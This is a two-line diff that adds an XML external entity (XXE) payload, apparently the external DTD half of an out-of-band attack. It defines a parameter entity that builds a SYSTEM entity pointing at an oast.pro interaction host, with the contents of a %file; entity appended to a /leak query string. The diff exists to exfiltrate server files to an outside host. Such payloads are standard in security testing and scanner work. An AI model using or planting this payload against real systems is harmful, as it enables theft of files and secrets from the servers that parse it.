@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://cvjbmudp0svs73ciq4igc8jqaz6d6gb1k.oast.pro/leak?data=%file;'>">
+%all;
